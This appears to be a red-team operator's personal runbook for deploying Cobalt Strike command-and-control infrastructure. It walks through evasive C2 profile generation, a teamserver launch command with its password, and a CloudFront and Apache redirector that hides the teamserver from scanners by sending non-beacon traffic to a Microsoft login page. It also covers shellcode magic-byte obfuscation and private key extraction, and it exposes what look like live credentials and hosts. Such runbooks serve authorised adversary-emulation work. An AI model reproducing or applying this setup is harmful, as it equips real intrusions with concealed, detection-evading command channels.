---
creation date: January 3rd 2022
last modified date: January 3rd 2022
aliases: []
tags: #📖
---

Primary Categories: [[01 - Operation]]
Secondary Categories:  [[02 - External]]
Links: 
Search Tag: #📖  

# [[CobaltStrike]]  

## Firewall
Before you start, set up the [[UFW]] firewall. 

### CobaltStrike Setup Checklist
1) Generate profile with sourcepoint
	- `sudo /tools/SourcePoint/SourcePoint -Host dugqf7e2zw0bb.cloudfront.net -Outfile /opt/cobaltstrike/sourcepoint.profile -Injector NtMapViewOfSection -Password <certificate-password-from-StepX> -Keystore <certificate-keystore-from-StepY> -Profile 5
	- Password and Keystore should be at the bottom of the amazon profile
	- cat /tools/Malleable-C2-Profiles/normal/amazon.profile
	- `SourcePoint -Host dugqf7e2zw0bb.cloudfront.net -Outfile /opt/cobaltstrike/sourcepoint.profile -Injector NtMapViewOfSection -Password "HR81N3D/7xaI2aZWHyOtUvUgwvX7rNl15M2E3TDhBcM=" -Keystore "covichhrservices.com.store" -Profile 5`
2) `python /tools/Malleable-C2-Randomizer/malleable-c2-randomizer.py -p /opt/cobaltstrike/sourcepoint.profile -cobalt /opt/cobaltstrike/`
3) modify http-config and http-get sections (metadata section) according to valkyrie notes below. Run c2lint to verify that its all good and no errors (in cobalt strike folder)
	- Might needs to run this if there are errors `sudo cp /tools/Malleable-C2-Profiles/normal/cloud-network.net.store /opt/cobaltstrike/
4) run ssl_certificates.sh (you probably won't need this)
	- certs end up in /tools/Malleable-C2-Profiles/normal/. They must be copied to /share/Working/infrastructure/certificates/.
5) Start teamserver `sudo /opt/cobaltstrike/teamserver 10.224.248.99 herecomestheboom! ./sourcepoint__Hwodu278.profile 2022-09-10`
6) If you have any issues run `sudo chown -R vnc:vnc cobaltstrike/`

## DNS Records 
For DNS traffic, you'll need ->

| Type | Host | Value |
| ---- | ---- | ----- |
| A | ns1 | \<TS IP\> |
| NS | dns | ns1.\<domain.com\> | 




## C2 Profile Generation

Should be located in /tools

DO NOT USE DEFAULT PROFILES 
Generate one with SourcePoint

Download sourcepoint from Tyl0us:
```bash 


go install github.com/Tylous/SourcePoint@latest
go build Sourcepoint.go

# or try this

git clone https://github.com/Tylous/SourcePoint.git

cd SourcePoint/

go build SourcePoint.go


```



Make sure you've exported the default GOPATH ([[GoLang]]) bin folder
![[GoLang#GoPATH]]

Use the following to generate (/tools/Malleable-C2-Profiles/normal/amazon.profile has the password and keystore):

```bash
SourcePoint -Host <TeamserverCLOUDFRONTDomain.com> -Outfile /opt/cobaltstrike/sourcepoint.profile -Injector NtMapViewOfSection -Password <certificate-password-from-StepX> -Keystore <certificate-keystore-from-StepY> -Profile 5
```

- [ ] Ensure host_stage is set to false
- [ ] Ensure http-post client block does not use GET requests 
- [ ] Ensure DNS is enabled and configure manually 
- [ ] Add pipename to post-ex block 
- [ ] If using cloudfront, set `trust_x_forwarded_for` to true
- [ ] If using cloudfront, fix metadata block
- [ ] Block suspicious user agents with http-config block 

```
http-config {
        #set "true" if teamserver is behind redirector
        set trust_x_forwarded_for "true";
        set block_useragents "curl*,lynx*,wget*,*virustotal*";
}
```

Always ensure no errors exist after generation:

```bash
./c2lint sourcepoint.profile
```

## Listener Setup
### DNS
Beacon Host
dns.domain.com

Stager Host 
ns1.domain.com 

## Cloudfront Redirector
If the fed lead has setup Cloudfront to use with your C2 listener, there have been issues where redirection works, but beacons show an error in the Teamserver output. The `metadata` block in the `http-get` profile configs has fixed this issue on multiple tests.
```text
http-get {

set uri "/messages/34qy6zr1SzlDY3zEIkNG9u35b7EnI0i ";


client {

	header "Host" "subdomain.cloudfront.net";
header "Accept" "*/*";
header "Accept-Language" "en-US";
header "Connection" "close";
	

        metadata {
            base64;
            prepend "session-token=";
            append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
	    append "; skin=noskin";
            header "Cookie";
	}


}

```

___

## SSL Certificates
The certificate store is located in /tools/Malleable-C2-Profiles/normal/domain.store file and the password is in the /tools/Malleable-C2-Profiles/normal/amazon.profile

To extract from .store to a form useable with Apache:

```bash
#!/bin/bash 

echo -n "What is the domain name (domain.com)? "
read DOMAIN
srcpass=$(tail -n 3 /tools/Malleable-C2-Profiles/normal/amazon.profile | grep 'password' | cut -f 2 -d '"')

DOMAIN=/tools/Malleable-C2-Profiles/normal/$DOMAIN

keytool -importkeystore -srckeystore $DOMAIN.store -destkeystore $DOMAIN.pfx -deststoretype PKCS12 -srcstorepass $srcpass -deststorepass $srcpass

openssl pkcs12 -in $DOMAIN.pfx -passin pass:$srcpass -nocerts -nodes | sed -ne '/-BEGIN PRIVATE KEY-/,/-END PRIVATE KEY-/p' > $DOMAIN.key
openssl pkcs12 -in $DOMAIN.pfx  -passin pass:$srcpass -clcerts -nokeys | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > $DOMAIN.cer
openssl pkcs12 -in $DOMAIN.pfx  -passin pass:$srcpass -cacerts -nokeys -chain | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > $DOMAIN-ca.cer

cat $DOMAIN.cer $DOMAIN-ca.cer > $DOMAIN-fullchain.pem
```


If for some reason this doesn't work and you need to generate new ones, see [[#Certificate Generation]]

## Apache Setup 
```bash 
sudo su -
apt update 
apt install apache2
a2enmod rewrite
a2enmod ssl 
a2enmod proxy
a2enmod proxy_http
systemctl restart apache2
cd /etc/apache2
ln -s ../sites-available/default-ssl.conf sites-enabled/default-ssl.conf
```

***/etc/apache2/sites-enabled/default-ssl.conf*
After making the below changes, run `systemctl restart apache2`
```apacheconf
<IfModule mod_ssl.c>
	<VirtualHost *:443>
		ServerAdmin webmaster@localhost

		DocumentRoot /var/www/html

		ErrorLog ${APACHE_LOG_DIR}/ssl-error.log
		CustomLog ${APACHE_LOG_DIR}/ssl-access.log combined

		SSLEngine on
		SSLProxyEngine on
		SSLProxyVerify none 
		SSLProxyCheckPeerCN off
		SSLProxyCheckPeerName off
		SSLProxyCheckPeerExpire off

		SSLCertificateFile /share/Working/infrastructure/certificates/domain.com.cer
		SSLCertificateKeyFile /share/Working/infrastructure/certificates/domain.com.key
		SSLCertificateChainFile /share/Working/infrastructure/certificates/domain.com-ca.cer

		<Directory /var/www/html>
			Order allow,deny
			Allow from all
			AllowOverride All 
		</Directory>
		<Proxy *>
		        Order allow,deny
		        Allow from all
		</Proxy>
		<FilesMatch "\.(cgi|shtml|phtml|php)$">
				SSLOptions +StdEnvVars
		</FilesMatch>
		<Directory /usr/lib/cgi-bin>
				SSLOptions +StdEnvVars
		</Directory>

	</VirtualHost>
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

***/etc/apache2/sites-enabled/000-default.conf*
```apacheconf 
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        <Directory /var/www/html>
               Order allow,deny
               Allow from all
               AllowOverride All 
        </Directory> 
        <Proxy *>
                Order allow,deny
                Allow from all
        </Proxy>

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

**_/var/www/html/.htaccess_**
This will redirect connections that doesn't have the correct user agent string to a microsoft login page.
```apacheconf 
RewriteEngine On

# Redirect User Agent from C2 Profile to the teamserver
RewriteCond %{HTTP_USER_AGENT} "Mozilla\/5.0 \(X11; Linux x86_64\) AppleWebKit\/537\.36 \(KHTML, like Gecko\) Chrome\/79\.0\.3945\.131 Safari\/537\.36"
RewriteRule ^.*$ %{REQUEST_SCHEME}://127.0.0.1:8443%{REQUEST_URI} [L,P]

# Redirect everyone else away
RewriteRule ^.*$ %{REQUEST_SCHEME}://login.microsoftonline.com/ [R=301,L]
```

### Block IPs using .HTAccess
```apacheconf
RewriteCond %{HTTP:X-Forwarded-For}i ^(1\.1\.1\.1|2\.2\.2\.2)
```


## Certificate Generation
You shouldn't need to do this 

### Install Certbot 
![[Certbot#Installation]]

### Acquire Certificates 
Run httpsc2doneright, changing letsencrypt-auto to certbot in the script
or
![[Certbot#Acquire Certificates]]


## backup
disconnect all sessions
stop cobalt strike
cd /share/working
tar zcvf cobaltstrike-fullback.tgz /opt/cobaltstrike
tar zcvf logs-backup.tgz /opt/cobaltstrike/logs

## issues

sudo chown -R vnc:vnc cobaltstrike/

## Shellcode Obfus
In profile:
```
set magic_mz_x86 "]U]U"; 
set magic_mz_x64 "A[AS"; 
set magic_pe "YC";
```

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: January 3rd 2022 (01:04 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
